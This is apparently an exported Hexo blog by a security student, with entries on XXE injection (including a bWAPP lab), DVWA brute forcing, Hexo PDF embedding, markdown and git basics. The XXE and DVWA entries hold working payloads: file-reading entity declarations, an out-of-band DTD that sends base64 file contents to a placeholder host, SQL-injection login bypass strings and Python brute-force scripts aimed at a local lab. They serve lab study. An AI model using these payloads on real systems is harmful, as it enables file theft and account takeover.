DTD外部实体声明DTD外部实体声明语法:&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;引用方式: &amp;实体名 外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下图所示:示例:12345&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; DTD参数实体声明语法:&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt; 或 &lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;引用方式:%实体名示例:1234&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt; 外部evil.dtd内容为:&lt;!ENTITY evil SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt; XXE的利用方式-DTDXXE作用利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议http等进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做了 XXE分类一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。 有回显情况有回显的情况可以使用如下的两种方式进行XXE注入攻击，也就是上面讲到的DTD外部实体声明和参数实体声明。方式一:12345&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; 方式二：123456&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt; 外部evil.dtd内容为:&lt;!ENTITY evil SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt; 无回显情况可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。123456&lt;!DOCTYPE updateProfile [&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php"&gt;&lt;!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd"&gt;%dtd;%send;]&gt; evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。注意此处的参数实体声明语法格式是:&lt;!ENTITY % 实体名称 &quot;值&quot;&gt;1234&lt;!ENTITY % all"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx/?data=%file;'&gt;"&gt;%all; 这里执行完查看结果分两种情况: 有报错有报错信息的话，直接查看错误信息有没有目标文件源码的base64 没有报错没有报错的话，查看被发送机(自己的主机且具有公网IP)的访问日志。 还有bWapp中的xxe利用，待更··· 2019/03/27 更 bWapp里的XXE实验0x01 进入bWapp，选择XXE漏洞环境 打开bWapp虚拟机,未安装参考BWAPP：一款非常好用的漏洞演示平台进行安装 使用账户:bee 密码:bug进行登录，并选择安全级别为low 登录后选择XXE漏洞环境,点击hack 成功进入到XXE漏洞环境 0x02 抓包分析 打开Burp，设置好浏览器代理，点击Any bugs?，查看抓包结果 对抓包结果分析，如上图所划线处，可以看到xxe-1.php页面以POST方式向xxe-2.php提交xml数据 0x03 构造payloadspayload:12345678&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE miracle [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;xxe;&lt;/login&gt;&lt;secret&gt;Any Bugs?&lt;/secret&gt;&lt;/reset&gt; 0x04 使用Burp repeater提交payloads 0x05 源码分析 先放源码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107&lt;?phpinclude("security.php");include("security_level_check.php");include("connect_i.php");$message = "";$body = file_get_contents("php://input");// If the security level is not MEDIUM or HIGHif($_COOKIE["security_level"] != "1" &amp;&amp; $_COOKIE["security_level"] != "2")&#123; ini_set("display_errors",1); $xml = simplexml_load_string($body); // Debugging // print_r($xml); $login = $xml-&gt;login; $secret = $xml-&gt;secret; if($login &amp;&amp; $login != "" &amp;&amp; $secret) &#123; // $login = mysqli_real_escape_string($link, $login); // $secret = mysqli_real_escape_string($link, $secret); $sql = "UPDATE users SET secret = '" . $secret . "' WHERE login = '" . $login . "'"; // Debugging // echo $sql; $recordset = $link-&gt;query($sql); if(!$recordset) &#123; die("Connect Error: " . $link-&gt;error); &#125; $message = $login . "'s secret has been reset!"; &#125; else &#123; $message = "An error occured!"; &#125;&#125;// If the security level is MEDIUM or HIGHelse&#123; // Disables XML external entities. Doesn't work with older PHP versions! // libxml_disable_entity_loader(true); $xml = simplexml_load_string($body); // Debugging // print_r($xml); $login = $_SESSION["login"]; $secret = $xml-&gt;secret; if($secret) &#123; $secret = mysqli_real_escape_string($link, $secret); $sql = "UPDATE users SET secret = '" . $secret . "' WHERE login = '" . $login . "'"; // Debugging // echo $sql; $recordset = $link-&gt;query($sql); if(!$recordset) &#123; die("Connect Error: " . $link-&gt;error); &#125; $message = $login . "'s secret has been reset!"; &#125; else &#123; $message = "An error occured!"; &#125;&#125;echo $message;$link-&gt;close();?&gt; 如下图,若安全级别为low的话，就从xml传输的数据中取出值来赋给login login再拼接成message message直接输出,所以存在XXE漏洞，利用login进行我们想要的操作并回显 在源码中也能看到，对于中高级别，login从Session中获取，secret从xml获取后也用 mysqli_real_escape_string函数进行了特殊字符转义。 总结本来还想写一下jarvis oj上一个xxe的例子，后面想想还是留到后面写刷jarvis题目的时候在写吧。XXE就学到这里吧(更深的现在也找不到例子学不来，2333，以后再深入吧)，过几天把SSRF简单学习总结一下。]]></content>
      <categories>
        <category>Web安全</category>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA之暴力破解]]></title>
    <url>%2FWeb%E5%AE%89%E5%85%A8%2FDVWA%2F%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%2Fdvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.html</url>
    <content type="text"><![CDATA[DVWA之暴力破解 针对DVWA里的暴力破解漏洞进行实验测试。主要内容包括BurpSuite的一些Intruder模块的基本使用和简单的python脚本编写。 简介搞Web安全和渗透的，估计都玩过Dvwa这个靶机。所以关于Dvwa就不说了。直接进入主题吧 Brute Force,即暴力(破解),是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击 话不多说，下面就针对Dvwa中暴力破解模块的不同级别进行分析测试吧。 Low级别先来看源码1234567891011121314151617181920212223242526272829303132&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125; ?&gt; 可以看到，对于登录的处理，服务器只是验证参数Login是否被设置，并没有任何的防爆破机制。因此可以通过BurpSuite进行爆破。if( isset( $_GET[ &#39;Login&#39; ] ) ) 此外对参数username、password等也没做任何过滤处理。因此此处还存在SQL注入漏洞，可以使用万能密码绕过，在用户名处输入admin&#39;#或者admin&#39; or &#39;1&#39;=&#39;1即可登录。 使用Burp进行爆破 打开Burp，记得设置浏览器代理。 进行抓包浏览器设置好代理后，点击Login按钮，可以看到Burp成功抓包 抓到包后，按ctrl+l键，或者右键选择send to Intruder 因为是要对password参数进行爆破，所以只在password参数内容两边加$ 设置好要爆破的参数后，选择Payloads模块设置字典。可以使用Burp自带的简单字典，或者自己去网上下载构造。因为此处Burp自带的字典里没有password(正确密码)，故我们手动加入进去 设置攻击字典后，设置爆破线程暴力破解是一个穷举的过程，速度很慢，故可以通过多线程加快速度。但Burp社区版不提供增加线程功能，我用的是Burp pro破解版将线程设为50个，然后点击start attack开始爆破 上一步点击开始爆破后，会切换到一个爆破任务详情新窗口在分析爆破结果前，先讲一下原理(感觉太啰嗦了，麻烦且累以后还是不写这么详细好了)我们分别通过万能密码和错误的密码成功登陆和失败登陆，如下两图可以看到，返回的信息是不同的，所以响应包的长度Length也不一样 因此，在爆破任务详情窗口可以通过Length进行筛选选出Length “与众不同”的payload即为密码 Medium级别贴上源码1234567891011121314151617181920212223242526272829303132333435&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Sanitise username input $user = $_GET[ 'username' ]; $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $pass = md5( $pass ); // Check the database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed sleep( 2 ); echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125; ?&gt; 可以看到，相比low级别的代码，这里主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号进行转义，基本上能抵御SQL注入攻击。但对登录并没做什么防护，因此跟Low级别一样，使用Burp进行爆破即可。 High级别贴上源码1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_GET[ 'username' ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $pass = md5( $pass ); // Check database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; ###分析High级别的代码加入了随机token，可以抵御CSRF攻击，但同时增加了爆破的难度。虽然不能用Burp爆破，但可以用python jio脚本呀先抓一下包分析一下请求可以看到，每次服务器返回的登录页面都会生成一个随机的user_token,用户每次登陆时都要将user_token一起提交，服务器每次收到请求后，也都会先做token的检查，再进行sql查询 脚本编写思路每次用python登录之前，先用python访问登录页面通过BeautifulSoup将user_token抓取出来。抓出来之后拼接url进行登录。我写了两个脚本，原理都差不多，不过是第二个用了requests库中的Session方法。 实现好了，不多bb，开始写吧 先贴代码1234567891011121314151617181920212223242526272829303132333435363738394041#Version:python3#coding=utf-8#Author:Miracle778from bs4 import BeautifulSoupimport urllib3import requestsheader = &#123; 'Host':'127.0.0.1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer':'http://127.0.0.1/vulnerabilities/brute/', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'zh-CN,zh;q=0.9', 'Cookie':'Pycharm-ae03759a=6fdf0374-3228-456b-ae40-07e2c178708e;PHPSESSID=3b23u5l2qlg5nmedn4ebrltbg6;security=high', 'Connection':'close'&#125;requrl = 'http://127.0.0.1/vulnerabilities/brute/'def get_token(requrl,header): req = requests.get(url=requrl,headers=header) response = req.text soup = BeautifulSoup(response,'html.parser') user_token = soup.form.find_all(name='input')[-1]['value'] return user_token#爆10次i = 0user_token= get_token(requrl,header)for line in open("passwd.txt"): url = requrl + '?username=admin&amp;password=' + line.strip() \ + '&amp;Login=Login&amp;user_token=' + user_token i = i+1 req = requests.get(url,headers=header) status_code = req.status_code length = len(req.text) print(i,'admin',line.strip(),status_code,length) user_token = get_token(requrl,header) if i==10: break 12345678910111213141516171819202122232425262728293031323334#Version:python3#coding=utf-8#Author:Miracle778import requestsfrom bs4 import BeautifulSoups = requests.Session()header = &#123; 'Host':'127.0.0.1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer':'http://127.0.0.1/vulnerabilities/brute/', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'zh-CN,zh;q=0.9', 'Cookie':'Pycharm-ae03759a=6fdf0374-3228-456b-ae40-07e2c178708e;PHPSESSID=3b23u5l2qlg5nmedn4ebrltbg6;security=high', 'Connection':'close'&#125;s.headers = headerrequrl = 'http://127.0.0.1/vulnerabilities/brute/'def get_token(requrl): req = s.get(requrl) soup = BeautifulSoup(req.text,'html.parser') user_token = soup.form.find_all(name='input')[-1]['value'] return user_tokenfor line in open("passwd.txt"): user_token = get_token(requrl) url = requrl + '?username=admin&amp;password=' + line.strip() \ + '&amp;Login=Login&amp;user_token=' + user_token reponse = s.get(url) status_code = reponse.status_code length = len(reponse.text) print('admin',line.strip(),status_code,length) 编写中注意的点先用浏览器F12一下，找出user_token所在标签理清结构后使用BeautifulSoup进行提取(可以用一些爬虫插件、或者直接用python解释器测试)得到BeautifulSoup提取语句：user_token = soup.form.find_all(name=&#39;input&#39;)[-1][&#39;value&#39;] 设置header要注意，不然脚本无效因为这个实验测试是之前做的，写文章的时候复现时发现，header不对的话脚本无效说一下设置header的方法吧。 用Burp抓一下包,然后照着结果设置header。此处应有个笑哭的emoji 效果 Impossible级别这个不怎么好写，就不写了 总结想起之前看别人博客学习的时候，别人写的太简洁了而自己知识面不够广，导致自己学习的时候一脸懵。那种自闭的感觉很容易消磨学习的兴趣。所以自己刚开始写Blog，就总想着写得详细。但写得详细的话，太费时间了。所以之后看情况写吧，一些太啰嗦的东西就懒得贴上来了。]]></content>
      <categories>
        <category>Web安全</category>
        <category>DVWA</category>
        <category>暴力破解</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>burpsuite</tag>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo中插入pdf解决方法]]></title>
    <url>%2Fpdf-test%2Fpdf-test.html</url>
    <content type="text"><![CDATA[解决hexo文章插入pdf的问题 搭好hexo博客后，想着把之前上课的实验弄上去，博客放实验报告，github放代码。互为参考。但word转成md文件太过麻烦。于是就想着直接把pdf放上来,网上搜一圈，发现都是说装一个叫 “hexo-pdf”的插件就行了。不知道是不是插件过时了还是我哪里出了问题，反正我用的时候pdf就死活出不来，于是自己瞎鸡儿琢磨了一个简单粗暴的方法，记录一下。 首先修改_config.yml文件将_config.yml中的post_asset_folder选项置为truepost_asset_folder: true 关于这个选项的功能说明如下: 当您设置post_asset_folder为true参数后，在建立文件时，Hexo 会自动建立一个与文章同名的文件夹，您可以把与该文章相关的所有资源都放到那个文件夹，如此一来，您便可以更方便的使用资源。 然后新建一篇文章$ hexo new &lt;article name&gt; 由于上一步已经将post_asset_folder选项设为了true所以这一步新建文章时会创建一个md文件和一个同名的文件夹为了方便叙述，我用test作为文件和文件夹名 编辑test&#x2E;md 用vim或者别的编辑器打开test&#x2E;mdtest&#x2E;md文件中加入如下代码&lt;object data=&quot;./test/test.pdf&quot; type=&quot;application/pdf&quot; width=&quot;100%&quot; height=&quot;100%&quot;&gt;关于这句代码简单的解释data表示你要上传的pdf的路径,使用相对路径，将你要上传的pdf放入第二步生成的test文 件夹type和width就不说了，这里注意height不能设成100%，不然太矮了，显示效果不好可以用浏览器预览，通过F12预估一下高度。我最后代码如下，供参考&lt;object data=&quot;./test/test.pdf&quot; type=&quot;application/pdf&quot; width=&quot;100%&quot; height=&quot;877px&quot;&gt; 这里不一定非用object标签，embed、iframe标签也一样具体参考:网页链接 效果此处上传一个测试pdf 总结今天刚看完markdown语法，难免想多写几篇blog练一练。其实今天发文章插图片的时候，插了好久才成功，不知道是什么原因，搞了好久。最后仔细看了看Git执行 $ hexo g输出信息中的生成的图片路径才有点眉目。直接打开hexo-asset-image插件的源码(在node_modules目录下)，原来是hexo-asset-image这个插件对图片路径名的处理函数跟我的输入路径对不上。所以会把我的图片路径转换错，所以一直访问不到。虽然js代码不会写，改不了插件源码，但我会看呀，把自己的图片路径输入格式按照它处理的那样输，最后成功解决。本来想记录一下再水一篇blog的，但后面懒的记了另外如果pdf插不成功的话，记得看一下$ hexo g的输出信息有没有生成pdf静态文件，然后检查检查路径 解决了pdf嵌入问题的话 那过几天就可以把我之前的实验报告弄上去了还记得上学期用pyqt做的端口扫描器跟注册表编辑器还有一些python网络编程写的辣鸡聊天室、辣鸡异步服务器等等还有密码学几个MFC写的辣鸡算法(不知道多久的以后应该会用python、Go重构一下)还有这学期会做几个信息隐藏的算法，辣鸡图片隐写术可能也会来瞎研究的一些Web安全、渗透方面的东西估计也会写一写 ···一大波辣鸡代码正在路上···]]></content>
      <categories>
        <category>pdf-test</category>
      </categories>
      <tags>
        <tag>hexo 插入pdf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown-study]]></title>
    <url>%2FStudy%2Fmarkdown%2Fmarkdown-study.html</url>
    <content type="text"><![CDATA[在Hexo上写文章肯定要回markdown，于是对着官方文档过了一遍，用的是VS code加Markdown Preview Enhanced插件，源码会放在最后。 中文文档地址 : https://markdown-zh.readthedocs.io/en/latest/ 标题现在听的歌王菲 - 我也不想这样段落This is a regular paragraph html里块级跟非块级标签不同用法,块级标签里面不能用md语法 Foo bar #块级元素里用md语法 无效 This is another regular paragraph html跟md语法的一些比较加粗体**text** 将text加粗，与&lt;b&gt;标签相似 加斜体span用处，组合行内元素，添加id class等属性 *text* md语法，表示斜体,与&lt;cite&gt;和&lt;em&gt;标签类似cite标签表示对文献的引用，为斜体一般和a标签一起用，链接到所参考位置 加删除线表示删除文本，html del标签md语法里用两条波浪线~表示 行尾加两个空格以上回车表示换行 标题两种表示方法第一种=、-文本下面加=表示一级标题，下面加-表示二级标题 第二种##的数量代表级数## 二级### 三级#### 四级 块级元素块引用 块引用，通过 >text声明 这是第一层 这是第二层 回到第一层 可以嵌套md语法 列表1 列表2 列表3 列表 无序列表 可用*、+、- 有序列表 使用数字加点如:1. Bird Magic 注释块 A list item with a blockquote: This is a blockquoteinside a list item. 代码块 A list item with a codeblock: def func(): print(&quot;hello Python!&quot;) 水平线用三个连着的字符(字符中间有空格不要紧，-，*，_) 内联元素内联链接中括号加括号[]()如:[miracle778’s Blog](https://miracle778.github.io) 显示如下miracle778’s Blog 引用链接两个中括号[ ][ ]This is [an example] [id] reference-style link.[id]: http://example.com/ “鼠标悬浮在id上显示的文字” 默认链接google 强调上面比较html跟md的时候有提到用单*或单_表示斜体，与&lt;em&gt;标签类似用双*或双_表示粗体,与&lt;strong&gt;标签类似 代码用 单`或三`，三`可以指定代码语言,如下1echo "hello bash"; 1echo "hello php"; 图片内联图片语法:![文件名](路径 “可选项:表示鼠标悬停显示信息”)如: 引用图片语法:![文件名][id] 其他自动链接语法:&lt;url&gt;http://miracle778.github.com 反斜杠转义常识，不写了 代码#标题 ## 现在听的歌 ### 王菲 - 我也不想这样 # 段落 This is a regular paragraph ## html里块级跟非块级标签不同用法,块级标签里面不能用md语法 &lt;table&gt; &lt;tr&gt; &lt;td&gt;Foo&lt;/td&gt; &lt;td&gt;bar&lt;/td&gt; &lt;td&gt;#块级元素里用md语法 无效&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; This is another regular paragraph &lt;br /&gt;&lt;br /&gt; ## html跟md语法的一些比较 ### 加粗体 \*\*text** 将text加粗，与&amp;lt;b&gt;标签相似 ### 加斜体 &lt;span id=&quot;span&quot;&gt;span用处，组合行内元素，添加id class等属性&lt;/span&gt; &lt;br/&gt; \*text\* md语法，表示斜体,与&amp;lt;cite&amp;gt;和&amp;lt;em&gt;标签类似&lt;br/&gt; &lt;cite&gt; &lt;a&gt;cite标签表示对文献的引用，为斜体一般和a标签一起用，链接到所参考位置&lt;/a&gt; &lt;/cite&gt; ### 加删除线 &lt;del&gt;表示删除文本，html del标签&lt;/del&gt; ~~md语法里用两条波浪线\~表示~~ **行尾加两个空格以上回车表示换行** # 标题两种表示方法 *第一种=、-* 文本下面加=表示一级标题，下面加-表示二级标题 一级标题 ========== 二级标题 --------- *第二种#* \#的数量代表级数 ## 二级 ### 三级 #### 四级 # 块级元素 ## 块引用 &gt; 块引用，通过 \&gt;text声明 &gt; &gt; &gt; 这是第一层 &gt; &gt; &gt; &gt; 这是第二层 &gt; &gt; &gt; **回到第一层** &gt; # 可以嵌套md语法 &gt; 1. 列表1 &gt; 2. 列表2 &gt; 3. 列表3 ## 列表 - 无序列表 + 可用*、+、- * 有序列表 + 使用数字加点1. 1. Bird 2. Magic ## 注释块 * A list item with a blockquote: &gt; This is a blockquote &gt; inside a list item. ## 代码块 * A list item with a codeblock: def func(): print(&quot;hello Python!&quot;) ## 水平线 用三个连着的字符(字符中间有空格不要紧，-，*，_) - - - _ _ ___ * * * # 内联元素 ## 内联链接 **中括号加括号\[]()** 如:\[miracle778&apos;s Blog](https://miracle778.github.io) 显示如下 [miracle778&apos;s Blog](https://miracle778.github.io) ## 引用链接 **两个中括号[ ][ ]** This is [an example] [id] reference-style link. &lt;!-- 引用链接时，声明需隔开一行 --&gt; [id]: http://example.com/ &quot;鼠标悬浮在id上显示的文字&quot; ## 默认链接 [google][] [google]:http://google.com ## 强调 **上面比较html跟md的时候有提到** 用单\*或单\_表示斜体，与&amp;lt;em&gt;标签类似 用双\*或双\_表示粗体,与&amp;lt;strong&gt;标签类似 ## 代码 用 单\`或三\`，三`可以指定代码语言,如下 1echo "hello bash"; 1echo "hello php"; ## 图片 ### 内联图片 语法:!\[文件名](路径 &quot;可选项:表示鼠标悬停显示信息&quot;)如: ![米兔](../images/markdown-study/米兔.jpg &quot;米兔&quot;) ### 引用图片 语法:!\[文件名]\[id] ![米兔][miracle] [miracle]: ../images/markdown-study/米兔.jpg &quot;可选项:鼠标悬停显示信息&quot; # 其他 ## 自动链接 语法:&amp;lt;url&amp;gt; &lt;http://miracle778.github.com&gt; ## 反斜杠转义 **常识，不写了** 总结markdown还是容易学的，几个小时就能搞懂。但在把文章部署到hexo上时，出现了点问题。原因是VScode的Markdown Preview Enhanced插件预览的效果跟实际发布的效果有点不同。vscode里加div这种标签预览可以正常显示，而发布后不能，搞得我微调了好久，还有就是引用资源的路径，插入图片需要配置一下。还好，都是一些小问题，以后多写写，养成习惯就好。]]></content>
      <categories>
        <category>Study</category>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>study note</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2Fhello%2Fhello-world.html</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>hello</category>
      </categories>
      <tags>
        <tag>Hello</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github入门与实践学习笔记]]></title>
    <url>%2FStudy%2Fgit%2Fgit-study.html</url>
    <content type="text"><![CDATA[这篇学习笔记是之前发在wordpress上的，现在迁移过来了。介绍了一些git的使用，其实写的很辣鸡，但毕竟当初也是认真写的，所以直接迁过来了。 学习github，找了本书《github入门与实践》，想着做点笔记。这本书目前看着还是很舒服的，把命令记一记，先贴个书的pdf链接 https://pan.baidu.com/s/1oayFJbXvu2ZhoGmCtn82wg 密码：baua 只是自己的笔记，写的时候可能只顾让自己看懂，如果别人也在学这本书的话，可以看看2333 第一章介绍了下github是什么，git与github的区别，没什么写的。 第二章讲了安装git，按照书上写的安装完git后，然后初始化git，设置一下使用git时的姓名和邮件地址，名字注意用英文输入 $git config –global user.name “Firstname Lastname”//你的用户名$git config –global user.email “your_email@example.com“//你的邮件地址$git config –global color.ui auto$git config –global core.autocrlf false 设置完之后用cat ~/.gitconfig查看，书上是写~/.gitconfig ，但是由于查看时.gitconfig不是可执行文件，所以要改成cat ~/.gitconfig 第三章第三章名字叫使用github的前期准备，所以就是一些准备工作 创建github账户，浏览器打开http://github.com/join 填写完自己的信息之后完成创建，创建完之后按照他的guide，新建hello-world项目。 设置SSH Key $ssh-keygen -t rsa -C “your_email@example.com“输入完命令之后可以在本地文件夹找到私钥：id_rsa和公钥id_rsa.pub 添加公开密钥：按照书上添加即可 用私钥连接github $ssh -T git@github.com 公开代码 clone已有仓库 $git clone git@github.com:xxxx/xxxx.git //仓库路径去github上找 克隆下来之后就可以在本地文件夹中找到以克隆仓库为名的文件夹，在这个文件夹中可以放入想要同步到github上的文件，比如写一个hello_world.php文件放入 用命令$git status查看刚刚放入的文件，由于hello-world.php文件还没有添加至git仓库，所以显示为Untracked files 将hello-world.php文件提交至仓库 $git add hello-world.php //git add命令将文件加入暂存区(缓存区) $git commit -m “Add hello world script by php” //git commit命令将文件提交到本地仓库 $git push //git push命令将本地参库修改同步至服务器仓库 $git log //git log命令查看提交日志 先写这么一点开个头，待更…2018/03/15 21:00更 第四章通过实际操作学习Git，这章主要讲Git一些常用操作，基本熟练了这一章的话，日常使用GitHub应该没问题，我也打算先学到这里，先把github作为一个仓库使使，日后按需学习2333… $git init—初始化仓库 直接上命令吧，详细的解释实在不记得可以翻书嘛1.先在本地建立一个目录作为仓库并初始化$mkdir d:/Github/git-tutorial //mkdir是linux命令，建立文件夹，因为书上用的是Git bash(linux环境)$cd git-tutorial //cd 命令切换目录，cd或cd ~是切换到主目录（home），cd ..是返回上一级，cd ../..是返回上两级，cd 指定路径$git init //进入到git-tutorial目录后，执行git init对仓库初始化，生成.git目录， .git 